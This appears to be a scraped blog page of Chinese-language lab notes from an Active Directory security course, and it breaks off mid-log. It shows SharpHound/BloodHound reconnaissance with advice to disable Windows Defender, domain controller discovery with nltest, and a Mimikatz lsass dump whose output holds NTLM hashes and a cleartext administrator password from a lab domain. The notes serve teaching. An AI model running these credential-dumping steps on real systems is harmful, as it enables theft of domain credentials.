<font color=FF0000>8/29更新：經過實測還是建議使用4.1.0</font>，詳細原因可以參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>，原作者說明這是一個bug，已在4.1.0做了修正，所以還是以4.1.0為主，雖然聽講師說可能會少東西，不過對我們小專案來說應該沒差
:::</li><li>Link: <a href=https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3>BloodHound GitHub</a></li><li>必要條件: 必須裝設Neo4j Server / Graph Database, 而且必須要是community version，<a href=https://neo4j.com/download-center/#community>link</a></li></ul><ol><li>Download Collector
BloodHound是一個環境調查的視覺化工具，所以要先在我們的環境先蒐集一些環境上的資訊，再導入到BloodHound中進行分析，因此我們應該先下載能夠蒐集環境資訊的<a href=https://github.com/BloodHoundAD/BloodHound>Collector</a>我是直接把整包clone下來，然後用隨身碟傳到VM(因為那時候Win10已經加入AD，我懶得改回來上網)
:::info
Note:
Windows的defender會擋<code>BloodHound-master/Collectors/SharpHound.exe</code>和<code>SharpHound.ps1</code>這兩個files，所以記得關掉defender
:::</li><li>Use the Collector First
:::info
Note: 記得要用bear的網域帳號登入，SharpHound.exe才找的到LDAP
:::
CMD直接進入<code>C:\tools\BloodHound-master\Collectors</code>，然後直接執行<code>$ SharpHound.exe</code>
:::spoiler Implementation<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ SharpHound.exe
</span></span><span style=display:flex><span>2023-08-29T11:02:31.4846421+08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
</span></span><span style=display:flex><span>2023-08-29T11:02:31.6707467+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
</span></span><span style=display:flex><span>2023-08-29T11:02:31.6985917+08:00|INFORMATION|Initializing SharpHound at 上午 11:02 on 2023/8/29
</span></span><span style=display:flex><span>2023-08-29T11:02:31.9891653+08:00|INFORMATION|<span style=color:#f92672>[</span>CommonLib LDAPUtils<span style=color:#f92672>]</span>Found usable Domain Controller <span style=color:#66d9ef>for</span> kuma.org : WIN-818G5VCOLJO.kuma.org
</span></span><span style=display:flex><span>2023-08-29T11:02:32.3820391+08:00|INFORMATION|Loaded cache with stats: <span style=color:#ae81ff>163</span> ID to type mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>163</span> name to SID mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1</span> machine sid mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span> sid to domain mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0</span> global catalog mappings.
</span></span><span style=display:flex><span>2023-08-29T11:02:32.3915435+08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
</span></span><span style=display:flex><span>2023-08-29T11:02:32.6206999+08:00|INFORMATION|Beginning LDAP search <span style=color:#66d9ef>for</span> kuma.org
</span></span><span style=display:flex><span>2023-08-29T11:02:32.8062803+08:00|INFORMATION|Producer has finished, closing LDAP channel
</span></span><span style=display:flex><span>2023-08-29T11:02:32.8230625+08:00|INFORMATION|LDAP channel closed, waiting <span style=color:#66d9ef>for</span> consumers
</span></span><span style=display:flex><span>2023-08-29T11:03:03.3930708+08:00|INFORMATION|Status: <span style=color:#ae81ff>0</span> objects finished <span style=color:#f92672>(</span>+0 0<span style=color:#f92672>)</span>/s -- Using <span style=color:#ae81ff>42</span> MB RAM
</span></span><span style=display:flex><span>2023-08-29T11:03:13.1743544+08:00|INFORMATION|Consumers finished, closing output channel
</span></span><span style=display:flex><span>Closing writers
</span></span><span style=display:flex><span>2023-08-29T11:03:13.2209345+08:00|INFORMATION|Output channel closed, waiting <span style=color:#66d9ef>for</span> output task to complete
</span></span><span style=display:flex><span>2023-08-29T11:03:13.3058132+08:00|INFORMATION|Status: <span style=color:#ae81ff>204</span> objects finished <span style=color:#f92672>(</span>+204 5.1<span style=color:#f92672>)</span>/s -- Using <span style=color:#ae81ff>44</span> MB RAM
</span></span><span style=display:flex><span>2023-08-29T11:03:13.3058132+08:00|INFORMATION|Enumeration finished in 00:00:40.6864986
</span></span><span style=display:flex><span>2023-08-29T11:03:13.3918361+08:00|INFORMATION|Saving cache with stats: <span style=color:#ae81ff>163</span> ID to type mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>163</span> name to SID mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1</span> machine sid mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span> sid to domain mappings.
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0</span> global catalog mappings.
</span></span><span style=display:flex><span>2023-08-29T11:03:13.4075189+08:00|INFORMATION|SharpHound Enumeration Completed at 上午 11:03 on 2023/8/29! Happy Graphing!
</span></span></code></pre></div>:::
理論上成功的話，會在該folder中出現一個.zip file with name <code>&lt;TimeStamp>.BloodHound.zip</code>此時按照之前啟動BloodHound的方法啟動BloodHound，然後把zip folder拖進去就可以了
<img src=https://hackmd.io/_uploads/rk8rZJjT2.png alt></li></ol><h3 id=如何偵測ad>==如何偵測AD==
<a class=anchor href=#%e5%a6%82%e4%bd%95%e5%81%b5%e6%b8%acad>#</a></h3><p>有兩種方法，也可以同時使用</p><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/>NTUSTISC - AD Note - Lab(當前網域控制站(DC))</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab當前網域控制站dc>NTUSTISC - AD Note - Lab(當前網域控制站(DC))
<a class=anchor href=#ntustisc---ad-note---lab%e7%95%b6%e5%89%8d%e7%b6%b2%e5%9f%9f%e6%8e%a7%e5%88%b6%e7%ab%99dc>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1</a></p><h2 id=lab-time---環境調查>Lab Time - 環境調查
<a class=anchor href=#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5>#</a></h2><h3 id=情報蒐集當前網域控制站dc>情報蒐集：==當前網域控制站(DC)==
<a class=anchor href=#%e6%83%85%e5%a0%b1%e8%92%90%e9%9b%86%e7%95%b6%e5%89%8d%e7%b6%b2%e5%9f%9f%e6%8e%a7%e5%88%b6%e7%ab%99dc>#</a></h3><p>以駭客的角度來說，如果已經連到AD中，要怎麼知道目前DC是誰
常用的cheat sheet</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ echo %logonserver%
$ nltest /dclist:&lt;domain&gt;
</code></pre><p>:::spoiler Implementation</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo %logonserver%
</span></span><span style=display:flex><span><span style=color:#ae81ff>\\</span>WIN-818G5VCOLJO
</span></span><span style=display:flex><span>$ nltest /dclist:kuma.org
</span></span><span style=display:flex><span>取得網域 <span style=color:#e6db74>&#39;kuma.org&#39;</span> <span style=color:#f92672>(</span>從 <span style=color:#e6db74>&#39;\\WIN-818G5VCOLJO.kuma.org&#39;</span><span style=color:#f92672>)</span> 中的 DC 清單。
</span></span><span style=display:flex><span>    WIN-818G5VCOLJO.kuma.org <span style=color:#f92672>[</span>PDC<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>DS<span style=color:#f92672>]</span> 站台: Default-First-Site-Name
</span></span><span style=display:flex><span>命令成功完成
</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/S1pgfnvph.png alt>
從Win10當中下指令的確可以知道Win2016的PC Name是<code>WIN-818G5VCOLJO</code>
:::</p></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab透過mimikatz取得local-admin的ntlm>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)
<a class=anchor href=#ntustisc---ad-note---lab%e9%80%8f%e9%81%8emimikatz%e5%8f%96%e5%be%97local-admin%e7%9a%84ntlm>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>得到更高權限之後，會想要更多的密碼</p><ul><li>密碼收集<ul><li>SAM.hive(Security Account Manager)</li><li>Password Spraying(用猜的)</li><li>GPO<ul><li>Where: <code>\\&lt;domain>\SysVol\&lt;domain>\Policie</code>，以本次實驗為例，就是放在<code>\\kuma.org\SYSVOL\kuma.org\Policies</code>，接下來就是隨機生成的<code>&lt;UID>\Users\Scripts</code>和<code>&lt;UID>\Machine\Scripts</code>，這兩個腳本是我們覺得重要的</li></ul></li><li>記憶體(lsass)<ul><li>為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證</li><li>==What is Mimikatz?==<blockquote><p>Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。
lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。
簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證</p></blockquote></li><li>Download: <a href=https://github.com/gentilkiwi/mimikatz>Mimikatz-github</a></li><li>How to use:
Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位
下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位</li><li>==lsass.exe VS SAM==
SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄</li></ul></li></ul></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=透過mimikatz取得local-admin的ntlm>==透過Mimikatz取得Local Admin的NTLM==
<a class=anchor href=#%e9%80%8f%e9%81%8emimikatz%e5%8f%96%e5%be%97local-admin%e7%9a%84ntlm>#</a></h3><ol><li>Activate Mimikatz
進入<code>C:\tools\mimikatz_trunk\x64</code>右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug)</li><li>起手式<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mimikatz <span style=color:#75715e># Privilege::Debug</span>
</span></span><span style=display:flex><span>Privilege <span style=color:#e6db74>&#39;20&#39;</span> OK
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># log</span>
</span></span><span style=display:flex><span>Using <span style=color:#e6db74>&#39;mimikatz.log&#39;</span> <span style=color:#66d9ef>for</span> logfile : OK
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># Sekurlsa::logonPasswords</span>
</span></span></code></pre></div>:::spoiler Log Reuslt<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Using <span style=color:#e6db74>&#39;mimikatz.log&#39;</span> <span style=color:#66d9ef>for</span> logfile : OK
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># Sekurlsa::logonPasswords</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>23133312</span> <span style=color:#f92672>(</span>00000000:0160fc80<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : CachedInteractive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : Administrator
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/9/4  06:07:18
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-500
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>     * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>     * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>     * Password : 1qaz@WSX3edc
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>20047794</span> <span style=color:#f92672>(</span>00000000:0131e7b2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : CachedInteractive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : Administrator
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/9/4  10:19:22
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-500
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>     * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>     * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>16441076</span> <span style=color:#f92672>(</span>00000000:00fadef4<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : administrator
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/9/4  12:44:48
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-500
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>     * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>     * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : Administrator
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : administrator
</span></span><span style=display:flex><span>     * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>14849757</span> <span style=color:#f92672>(</span>00000000:00e296dd<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : DefaultAppPool
</span></span><span style=display:flex><span>Domain            : IIS APPPOOL
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/3  09:44:12
</span></span><span style=display:flex><span>SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma.org
</span></span><span style=display:flex><span>     * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>1299130</span> <span style=color:#f92672>(</span>00000000:0013d2ba<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : bear
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:47:58
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-2101
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : bear
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>     * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>     * DPAPI    : 4057a0d0b94378dd03224e8b3d28a006
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : bear
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : bear
</span></span><span style=display:flex><span>     * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>995</span> <span style=color:#f92672>(</span>00000000:000003e3<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : IUSR
</span></span><span style=display:flex><span>Domain            : NT AUTHORITY
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:42
</span></span><span style=display:flex><span>SID               : S-1-5-17
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     * Domain   : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>997</span> <span style=color:#f92672>(</span>00000000:000003e5<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : LOCAL SERVICE
</span></span><span style=display:flex><span>Domain            : NT AUTHORITY
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:39
</span></span><span style=display:flex><span>SID               : S-1-5-19
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     * Domain   : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     * Domain   : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>70138</span> <span style=color:#f92672>(</span>00000000:000111fa<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : DWM-1
</span></span><span style=display:flex><span>Domain            : Window Manager
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:38
</span></span><span style=display:flex><span>SID               : S-1-5-90-0-1
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma.org
</span></span><span style=display:flex><span>     * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>    ssp :	
</span></span><span style=display:flex><span>    credman :	
</span></span><span style=display:flex><span>    cloudap :	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>70109</span> <span style=color:#f92672>(</span>00000000:000111dd<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : DWM-1
</span></span><span style=display:flex><span>Domain            : Window Manager
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/8/29  12:40:38
</span></span><span style=display:flex><span>SID               : S-1-5-90-0-1
</span></span><span style=display:flex><span>    msv :	
</span></span><span style=display:flex><span>     <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>     * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>    tspkg :	
</span></span><span style=display:flex><span>    wdigest :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma
</span></span><span style=display:flex><span>     * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    kerberos :	
</span></span><span style=display:flex><span>     * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>     * Domain   : kuma.org
</span></span><span style=display:flex><span>     * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>    ssp :	
